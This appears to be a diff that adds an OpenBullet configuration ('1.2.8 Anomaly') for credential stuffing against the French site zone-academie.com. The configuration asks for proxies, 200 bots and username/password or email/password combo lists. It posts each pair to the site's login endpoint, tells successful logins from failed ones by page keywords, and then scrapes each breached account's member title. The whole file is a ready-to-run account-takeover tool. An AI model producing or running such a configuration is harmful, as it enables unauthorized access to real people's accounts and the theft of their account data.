@@ -1,0 +1,69 @@
+[SETTINGS]
+{
+  "CreatorLK": "OB-a649c08b884cdd191f9726414552e0ce-LoliKEY",
+  "Name": "Zone-Academie.com",
+  "SuggestedBots": 200,
+  "LastModified": "2019-04-27T15:43:49.6874881+02:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "xX-365094-Xx",
+  "Version": "1.2.8 Anomaly",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://zone-academie.com/login/login" 
+  CONTENT "login=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "origin: https://zone-academie.com" 
+  HEADER "referer: https://zone-academie.com/login/login" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Membres" 
+  KEYCHAIN Failure OR 
+    KEY "S'identifier" 
+
+REQUEST GET "https://zone-academie.com/account/account-details" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "origin: https://zone-academie.com" 
+  HEADER "referer: https://zone-academie.com/login/login" 
+
+PARSE "<SOURCE>" LR "<a class=\"blockLink\" href=\"" "\"><i" -> VAR "KEY" 
+
+REQUEST GET "<KEY>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "origin: https://zone-academie.com" 
+  HEADER "referer: https://zone-academie.com/login/login" 
+
+PARSE "<SOURCE>" CSS "#top > div.p-body > div > div > div.p-body-content > div > div > div > div > div > div.memberHeader-main > div > div.memberHeader-blurb > span.userTitle" "innerHTML" -> CAP "Statue" 
+
